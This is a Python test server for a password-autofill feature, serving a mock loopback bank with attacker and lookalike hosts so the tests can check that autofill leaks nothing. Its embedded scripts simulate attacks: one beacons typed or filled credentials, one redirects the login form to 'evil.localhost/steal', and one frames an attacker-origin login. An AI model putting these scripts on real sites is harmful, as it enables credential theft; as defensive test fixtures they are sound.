#!/usr/bin/env python3
"""The autofill tests' web site: a bank that is not one, on loopback only.

    server.py --https-port P --http-port Q --cert C --key K --log L

One process serves every host name the tests use -- bank.localhost (the real
site), evil.localhost and bank.localhost.evil.localhost (the attacker and the
lookalike) -- told apart by the Host header. Both engines resolve *.localhost
to loopback themselves, so nothing touches /etc/hosts or the network.

Every form post, every beacon a page sends and every sign-in is appended to
the log as one JSON line, which is what the test script asserts on. The site
keeps one account in memory; /change changes its password the way a real site
would.
"""
import argparse
import html
import json
import ssl
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ACCOUNTS = {}  # username -> password
LOCK = threading.Lock()
LOG = None
HTTPS_PORT = 0


def log(**rec):
    rec["t"] = round(time.time(), 3)
    with LOCK:
        with open(LOG, "a") as f:
            f.write(json.dumps(rec) + "\n")


STYLE = """
<style>
  :root { color-scheme: light; font-family: system-ui, sans-serif; }
  body { margin: 0; background: #f4f6fb; color: #172033; }
  header { background: #12355b; color: white; padding: 14px 28px; font-weight: 600; letter-spacing: .02em; }
  main { max-width: 380px; margin: 48px auto; background: white; border-radius: 12px; padding: 28px 30px 30px;
         box-shadow: 0 1px 3px rgba(0,0,0,.08), 0 8px 24px rgba(18,53,91,.08); }
  h1 { font-size: 20px; margin: 0 0 18px; }
  label { display: block; font-size: 13px; color: #4b5872; margin: 14px 0 6px; }
  input { width: 100%; box-sizing: border-box; font-size: 15px; padding: 9px 11px; border: 1px solid #c9d2e3; border-radius: 8px; }
  input:focus { outline: 2px solid #3b82f6; outline-offset: 1px; border-color: #3b82f6; }
  button { margin-top: 20px; width: 100%; padding: 10px; font-size: 15px; border: 0; border-radius: 8px; background: #12355b; color: white; }
  p.note { font-size: 13px; color: #4b5872; }
  iframe { width: 100%; height: 260px; border: 1px dashed #c9d2e3; border-radius: 8px; margin-top: 12px; }
</style>
"""


def page(title, body, head=""):
    return f"""<!doctype html><html><head><meta charset="utf-8"><title>{html.escape(title)}</title>{STYLE}{head}</head>
<body><header>Loopback Savings &amp; Loan</header><main>{body}</main></body></html>"""


LOGIN_FORM = """<h1>{h1}</h1>
<form method="post" action="{action}" id="f">
  <label for="u">Email</label>
  <input id="u" name="username" type="email" autocomplete="username" {autofocus}>
  <label for="p">Password</label>
  <input id="p" name="password" type="password" autocomplete="current-password">
  <button type="submit">Sign in</button>
</form>"""


def login_page(action="/login", autofocus=True, h1="Sign in", extra="", head=""):
    body = LOGIN_FORM.format(action=action, autofocus="autofocus" if autofocus else "", h1=h1) + extra
    return page(h1, body, head)


# Reads the fields every 40 ms from the moment the page exists and beacons any
# value it sees, with the time; the test asserts nothing arrives before the
# person picks a login. It also looks for anything autofill might have left
# on the page's own globals.
LEAK_JS = """<script>
(() => {
  const seen = {};
  const send = (what, v) => { navigator.sendBeacon('/beacon?what=' + what + '&v=' + encodeURIComponent(v)); };
  const globals = Object.getOwnPropertyNames(window).filter(n => /palm|autofill|fill/i.test(n));
  send('globals', JSON.stringify(globals));
  setInterval(() => {
    for (const id of ['u', 'p']) {
      const el = document.getElementById(id);
      if (el && el.value && !seen[id + el.value]) { seen[id + el.value] = 1; send(id === 'u' ? 'username' : 'password', el.value); }
    }
  }, 40);
})();
</script>"""

# The form's action moves to the attacker's origin as soon as a field is
# focused: an injected script (or HTML) trying to collect what autofill puts in.
SWAP_JS = """<script>
(() => {
  const swap = () => { document.getElementById('f').action = 'https://evil.localhost:%d/steal'; };
  document.addEventListener('focusin', swap);
  // an autofocus may have happened before this script ran
  if (document.activeElement && document.activeElement.form) swap();
})();
</script>"""

# React's controlled inputs, reduced to the mechanism that matters: React keeps
# its own copy of each input's value (a tracker on the element) and acts on an
# `input` event only when the element's value differs from that copy. Here the
# component state is what gets submitted -- so a fill that sets .value without
# an input event, or through the element's own (tracked) setter, submits empty.
REACT_JS = """<script>
(() => {
  const state = { username: '', password: '' };
  for (const [id, key] of [['u', 'username'], ['p', 'password']]) {
    const el = document.getElementById(id);
    const proto = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
    let tracked = '';
    // React's inputValueTracking: an own 'value' property that records sets
    Object.defineProperty(el, 'value', {
      configurable: true,
      get() { return proto.get.call(this); },
      set(v) { tracked = '' + v; proto.set.call(this, v); },
    });
    el.addEventListener('input', () => {
      const now = proto.get.call(el);
      if (now !== tracked) { tracked = now; state[key] = now; }
    });
  }
  document.getElementById('f').addEventListener('submit', (e) => {
    e.preventDefault();
    fetch('/react-login', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(state) })
      .then(r => r.text()).then(t => { document.querySelector('main').innerHTML = t; document.title = 'React signed in'; });
  });
})();
</script>"""


class H(BaseHTTPRequestHandler):
    server_version = "loopback-bank"

    def log_message(self, fmt, *args):  # quiet
        pass

    def host(self):
        return (self.headers.get("Host") or "").split(":")[0]

    def origin(self):
        scheme = "https" if isinstance(self.connection, ssl.SSLSocket) else "http"
        return f"{scheme}://{self.headers.get('Host')}"

    def send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)

    def user(self):
        for part in (self.headers.get("Cookie") or "").split(";"):
            k, _, v = part.strip().partition("=")
            if k == "u":
                return urllib.parse.unquote(v)
        return ""

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(u.query)
        path = u.path
        log(kind="get", origin=self.origin(), path=path)
        if path == "/beacon":
            log(kind="beacon", origin=self.origin(), what=q.get("what", [""])[0], value=q.get("v", [""])[0])
            return self.send(204, "")
        if path in ("/", "/login"):
            return self.send(200, login_page())
        if path == "/login-nofocus":
            return self.send(200, login_page(autofocus=False))
        if path == "/leak":
            return self.send(200, login_page(h1="Sign in (watched)", head=LEAK_JS))
        if path == "/swap":
            return self.send(200, login_page(h1="Sign in (swapped)", extra=SWAP_JS % HTTPS_PORT))
        if path == "/react":
            return self.send(200, login_page(action="/react-login", h1="Sign in (React)", extra=REACT_JS))
        if path == "/frame":
            # the top level is the bank; the login form is the attacker's,
            # in an iframe that takes focus by itself
            src = f"https://evil.localhost:{HTTPS_PORT}/login"
            return self.send(200, page("A page with a frame", f"<h1>Statement</h1><p class=note>Below, a frame from another site.</p><iframe src='{src}'></iframe>"))
        if path == "/frame-same":
            src = f"https://{self.headers.get('Host')}/login"
            return self.send(200, page("A page with a frame", f"<h1>Statement</h1><p class=note>Below, a frame from this site.</p><iframe src='{src}'></iframe>"))
        if path == "/change":
            who = self.user()
            body = f"""<h1>Change password</h1>
<form method="post" action="/change" id="f">
  <input type="hidden" name="username" autocomplete="username" value="{html.escape(who)}">
  <p class=note>Signed in as {html.escape(who) or 'nobody'}.</p>
  <label for="c">Current password</label>
  <input id="c" name="current" type="password" autocomplete="current-password" autofocus>
  <label for="n">New password</label>
  <input id="n" name="new" type="password" autocomplete="new-password">
  <label for="n2">Repeat the new password</label>
  <input id="n2" name="new2" type="password" autocomplete="new-password">
  <button type="submit">Change password</button>
</form>
<script>
// Chromium skips `autofocus` on a document reached by a navigation from the
// address bar after the first; most sites focus the field from script anyway
addEventListener('DOMContentLoaded', () => document.getElementById('c').focus());
</script>"""
            return self.send(200, page("Change password", body))
        if path == "/steal":
            return self.send(200, page("Stolen", "<h1>Thanks</h1>"))
        return self.send(404, page("Not found", "<h1>Not found</h1>"))

    def body(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n).decode()
        if (self.headers.get("Content-Type") or "").startswith("application/json"):
            return json.loads(raw or "{}")
        return {k: v[0] for k, v in urllib.parse.parse_qs(raw, keep_blank_values=True).items()}

    def do_POST(self):
        u = urllib.parse.urlparse(self.path)
        path = u.path
        if path == "/beacon":  # navigator.sendBeacon posts
            self.body()
            q = urllib.parse.parse_qs(u.query)
            log(kind="beacon", origin=self.origin(), what=q.get("what", [""])[0], value=q.get("v", [""])[0])
            return self.send(204, "")
        form = self.body()
        log(kind="post", origin=self.origin(), path=path, form=form)
        if path in ("/login", "/react-login"):
            user, pw = form.get("username", ""), form.get("password", "")
            with LOCK:
                good = user in ACCOUNTS and ACCOUNTS[user] == pw
            log(kind="signin", origin=self.origin(), path=path, user=user, ok=good)
            if not good:
                return self.send(401, page("Wrong password", "<h1>That did not work</h1><p class=note>Wrong email or password.</p><a href='/login'>Try again</a>"))
            body = f"<h1>Welcome back</h1><p class=note>Signed in as {html.escape(user)}.</p><p><a id=change href='/change'>Change your password</a></p>"
            if path == "/react-login":
                return self.send(200, body)
            return self.send(200, page("Signed in", body), extra={"Set-Cookie": f"u={urllib.parse.quote(user)}; Path=/; Secure; HttpOnly"})
        if path == "/change":
            user, cur, new, new2 = form.get("username", ""), form.get("current", ""), form.get("new", ""), form.get("new2", "")
            with LOCK:
                ok = user in ACCOUNTS and ACCOUNTS[user] == cur and new and new == new2
                if ok:
                    ACCOUNTS[user] = new
            log(kind="changed", origin=self.origin(), user=user, ok=bool(ok))
            if not ok:
                return self.send(400, page("Not changed", "<h1>Password not changed</h1>"))
            return self.send(200, page("Password changed", f"<h1>Password changed</h1><p class=note>{html.escape(user)} has a new password.</p>"))
        if path == "/steal":
            return self.send(200, page("Stolen", "<h1>Thanks</h1>"))
        return self.send(404, "")


def main():
    global LOG, HTTPS_PORT
    ap = argparse.ArgumentParser()
    ap.add_argument("--https-port", type=int, required=True)
    ap.add_argument("--http-port", type=int, required=True)
    ap.add_argument("--cert", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--log", required=True)
    ap.add_argument("--account", action="append", default=[], help="user:password")
    a = ap.parse_args()
    LOG = a.log
    HTTPS_PORT = a.https_port
    for acc in a.account:
        u, _, p = acc.partition(":")
        ACCOUNTS[u] = p
    https = ThreadingHTTPServer(("127.0.0.1", a.https_port), H)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(a.cert, a.key)
    https.socket = ctx.wrap_socket(https.socket, server_side=True)
    http = ThreadingHTTPServer(("127.0.0.1", a.http_port), H)
    threading.Thread(target=http.serve_forever, daemon=True).start()
    print(f"serving https on {a.https_port}, http on {a.http_port}", flush=True)
    try:
        https.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
